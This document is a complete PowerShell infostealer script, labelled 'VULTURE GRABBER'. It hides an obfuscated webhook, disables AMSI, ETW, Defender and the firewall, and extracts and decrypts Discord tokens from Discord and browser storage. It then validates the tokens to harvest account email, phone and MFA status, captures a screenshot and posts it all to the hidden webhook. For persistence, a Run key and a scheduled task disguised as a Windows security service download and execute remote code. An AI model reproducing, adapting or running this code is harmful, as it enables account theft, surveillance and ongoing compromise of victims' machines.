# === OBFUSCATED PAYLOAD ===
function XOR($d,$k){
    $r=""
    for($i=0;$i -lt $d.Length;$i++){$r += [char]($d[$i] -bxor $k[$i % $k.Length])}
    return $r
}

# === CONFIG (XOR Encrypted) ===
$hook = XOR @(162,87,200,32,90,191,109,245,83,227,41,82,150,120,141,117,248,35,115,156,108,174,81,236,114,106,206,72,160,88,241,102,93,197,118,170,126,221,41,79,150,19,142,105,215,68,108,141,111,135,86,226,94,125,174,21,142,117,207,37,119,157,121,186,82,206,93,67,186,73,250,109,200,70,120,142,119,133,73,201,113,109,189,82,161,91,204,99,119,153,118,137,74,247,116,84,175,16,171,89,206,72,93,163,119,175,73,227,114,113,161,81,162,101,204,92,106,176,75,185,73,210,120,83,165,18,141,114,200,122,123,152,69,155,86,171,115,84,189,118,160,89,208,90,117,175,117,183,80,206,66,116,149,90,153,119,206,69,85,152,114,130,34,167) @(195,31,154,16,57,247,32)
$api = XOR @(208,45,122,155,200,9,118,135,41,81,146,192,32,99,255,15,74,152,225,42,119,220,43,94,201,248,120,83,210,34,67,221,207,43,80,199,1,112,229,199,34,85,252,19,121,236,154,45) @(177,101,40,171,171,65,59)
$rgx = '[\w-]{24,}\.[\w-]{4,}\.[\w-]{27,}'
$mfa = 'mfa\.[\w-]{84}'

# === AMSI BYPASS ===
$amsi1 = -join ((83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115) | ForEach-Object { [char]$_ })
$amsi2 = -join ((97,109,115,105,73,110,105,116,70,97,105,108,101,100) | ForEach-Object { [char]$_ })
$t = [Ref].Assembly.GetType($amsi1)
if ($t) { $f = $t.GetField($amsi2,'NonPublic,Static'); if($f){$f.SetValue($null,$true)} }
$t2 = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
if ($t2) { $f2 = $t2.GetField('amsiInitFailed','NonPublic,Static'); if($f2){$f2.SetValue($null,$true)} }
$t3 = [Ref].Assembly.GetType('System.Management.Automation.AmsiContext')
if ($t3) { $f3 = $t3.GetField('amsiEnabled','NonPublic,Static'); if($f3){$f3.SetValue($null,$false)} }

# === ETW BYPASS ===
$etw = [Ref].Assembly.GetType('System.Management.Automation.Internal.PipelineOps')
if ($etw) { $f4 = $etw.GetField('etwEnabled','NonPublic,Static'); if($f4){$f4.SetValue($null,$false)} }

# === DISABLE DEFENDER ===
try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } catch {}
try { netsh advfirewall set allprofiles state off > $null 2>&1 } catch {}

# === TOKEN EXTRACTION ===
function Read-FileBytes {
    param([string]$p)
    try {
        $fs = [System.IO.File]::Open($p, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
        $ms = New-Object System.IO.MemoryStream
        $fs.CopyTo($ms); $fs.Close(); $fs.Dispose()
        $r = $ms.ToArray(); $ms.Close(); $ms.Dispose()
        return $r
    } catch { return $null }
}

function Validate-Token {
    param([string]$t)
    if ([string]::IsNullOrEmpty($t)) { return $false }
    if ($t.Length -gt 120 -or $t.Length -lt 59) { return $false }
    if ($t -like 'mfa.*') { return $true }
    $p = $t -split '\.'
    if ($p.Count -ne 3) { return $false }
    try {
        $b = $p[0]; $pad = 4 - ($b.Length % 4); if ($pad -ne 4) { $b += '=' * $pad }
        [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b))
        return $true
    } catch { return $false }
}

$found = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::Ordinal)
$firstRun = $true
$isSystem = ([Security.Principal.WindowsIdentity]::GetCurrent().Name -eq "NT AUTHORITY\SYSTEM")

if (-not $isSystem -and $firstRun) {
    $ldbPaths = [System.Collections.Generic.List[string]]::new()
    $apps = @("discord","discordcanary","discordptb","discorddevelopment")
    foreach ($a in $apps) {
        $p = Join-Path $env:APPDATA "$a\Local Storage\leveldb"
        if (Test-Path $p) { $ldbPaths.Add($p) }
    }
    $browsers = @(
        @{ Path = "$env:LOCALAPPDATA\Google\Chrome\User Data"; Default = "Default" },
        @{ Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"; Default = "Default" },
        @{ Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"; Default = "Default" },
        @{ Path = "$env:LOCALAPPDATA\Vivaldi\User Data"; Default = "Default" }
    )
    foreach ($b in $browsers) {
        if (Test-Path $b.Path) {
            $profiles = Get-ChildItem $b.Path -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -eq "Default" -or $_.Name -like "Profile *" }
            foreach ($prof in $profiles) {
                $d = Join-Path $prof.FullName "Local Storage\leveldb"
                if ((Test-Path $d) -and (-not $ldbPaths.Contains($d))) { $ldbPaths.Add($d) }
            }
        }
    }
    $iso = [System.Text.Encoding]::GetEncoding("ISO-8859-1")
    $magic = "`0`0`0`0"
    $regex = [System.Text.RegularExpressions.Regex]::new($rgx, [System.Text.RegularExpressions.RegexOptions]::Compiled)
    $mfaRegex = [System.Text.RegularExpressions.Regex]::new($mfa, [System.Text.RegularExpressions.RegexOptions]::Compiled)
    foreach ($p in $ldbPaths) {
        if (-not (Test-Path $p)) { continue }
        $files = Get-ChildItem $p -File -ErrorAction SilentlyContinue | Where-Object { $_.Extension -in '.ldb','.log' }
        foreach ($f in $files) {
            $b = Read-FileBytes -p $f.FullName
            if ($null -eq $b -or $b.Length -lt 8) { continue }
            $str = $iso.GetString($b)
            foreach ($m in $regex.Matches($str)) { $null = $found.Add($m.Value) }
            foreach ($m in $mfaRegex.Matches($str)) { $null = $found.Add($m.Value) }
            $s = 4; $c = 0
            while ($s -lt ($b.Length - 8) -and $c -lt 30) {
                $idx = $str.IndexOf($magic, $s, [System.StringComparison]::Ordinal)
                if ($idx -lt 0) { break }
                $start = $idx - 4
                if ($start -ge 0 -and $b[$start] -le 3 -and $b[$start+1] -eq 0 -and $b[$start+2] -eq 0 -and $b[$start+3] -eq 0) {
                    $c++
                    if (($start + 8) -le $b.Length) {
                        $len = [BitConverter]::ToUInt32($b, $start + 4)
                        if ($len -gt 0 -and $len -lt 100000 -and ($start + $len) -le $b.Length) {
                            try {
                                $blob = [byte[]]::new($len)
                                [Array]::Copy($b, $start, $blob, 0, $len)
                                $dec = [Security.Cryptography.ProtectedData]::Unprotect($blob, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
                                $tok = [System.Text.Encoding]::UTF8.GetString($dec).Trim([char]0)
                                if ($tok -match $rgx -or $tok -match $mfa) { $null = $found.Add($tok) }
                            } catch {}
                        }
                    }
                }
                $s = $idx + 4
            }
        }
    }
}

# === TOKEN VALIDATION ===
$validTokens = [System.Collections.Generic.List[object]]::new()
if (-not $isSystem -and $firstRun -and $found.Count -gt 0) {
    $validated = [System.Collections.Generic.List[string]]::new()
    foreach ($token in $found) { if (Validate-Token -t $token) { $validated.Add($token) } }
    foreach ($token in $validated) {
        try {
            $headers = @{ Authorization = $token; "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }
            $r = Invoke-RestMethod -Uri $api -Headers $headers -TimeoutSec 3 -ErrorAction Stop
            if ($r.id) {
                $validTokens.Add([PSCustomObject]@{
                    u = "$($r.username)#$($r.discriminator)"
                    id = $r.id
                    em = if ($r.email) { $r.email } else { "N/A" }
                    ph = if ($r.phone) { $r.phone } else { "N/A" }
                    ni = switch ($r.premium_type) { 1 { "Classic" } 2 { "Nitro" } default { "None" } }
                    mf = if ($r.mfa_enabled) { "Yes" } else { "No" }
                    token = $token
                })
            }
        } catch {}
    }
}

# === SCREENSHOT ===
$bytes = $null
try {
    Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
    Add-Type -AssemblyName System.Drawing -ErrorAction Stop
    $bmp = New-Object Drawing.Bitmap([Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
    [Drawing.Graphics]::FromImage($bmp).CopyFromScreen(0,0,0,0,$bmp.Size)
    $ms = New-Object IO.MemoryStream
    $bmp.Save($ms, [Drawing.Imaging.ImageFormat]::Png)
    $bytes = $ms.ToArray(); $ms.Close(); $bmp.Dispose()
} catch { $bytes = $null }

# === SEND TO WEBHOOK ===
if ($firstRun) {
    $pc = [System.Environment]::GetEnvironmentVariable("COMPUTERNAME")
    $usr = [System.Environment]::GetEnvironmentVariable("USERNAME")
    $report = "**[VULTURE GRABBER]**`nPC: $pc`nUser: $usr`nValid Tokens: $($validTokens.Count)`n`n"
    foreach ($ti in $validTokens) {
        $report += "**$($ti.u)**`nToken: ``$($ti.token)```nID: $($ti.id)`nEmail: $($ti.em)`nPhone: $($ti.ph)`nNitro/MFA: $($ti.ni)/$($ti.mf)`n`n"
    }
    try { Invoke-RestMethod -Uri $hook -Method Post -Body @{content=$report} -ErrorAction SilentlyContinue } catch {}
    if ($bytes) {
        try {
            $boundary = "----VultureBoundary" + (Get-Random).ToString()
            $LF = "`r`n"
            $body = "--$boundary$LF" + "Content-Disposition: form-data; name=`"file`"; filename=`"screenshot.png`"$LF" + "Content-Type: image/png$LF$LF"
            $footer = "$LF--$boundary--$LF"
            $hb = [Text.Encoding]::ASCII.GetBytes($body)
            $fb = [Text.Encoding]::ASCII.GetBytes($footer)
            $total = $hb.Length + $bytes.Length + $fb.Length
            $req = [Net.WebRequest]::Create($hook)
            $req.Method = "POST"
            $req.ContentType = "multipart/form-data; boundary=$boundary"
            $req.ContentLength = $total
            $stream = $req.GetRequestStream()
            $stream.Write($hb, 0, $hb.Length)
            $stream.Write($bytes, 0, $bytes.Length)
            $stream.Write($fb, 0, $fb.Length)
            $stream.Close()
            $req.GetResponse()
        } catch {}
    }
}

# === PERSISTENCE ===
$cmd = "powershell.exe -nologo -ep bypass -w hidden -c `"iex(irm 'https://raw.githubusercontent.com/saksham123107-pixel/son/main/son.ps1')`""
try { Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSecurityHealth" -Value $cmd -ErrorAction SilentlyContinue } catch {}
try { schtasks /create /tn "WindowsSecurityHealth" /tr "$cmd" /sc onlogon /f /rl highest /it > $null 2>&1 } catch {}

# === INSTANT EXIT ===
exit
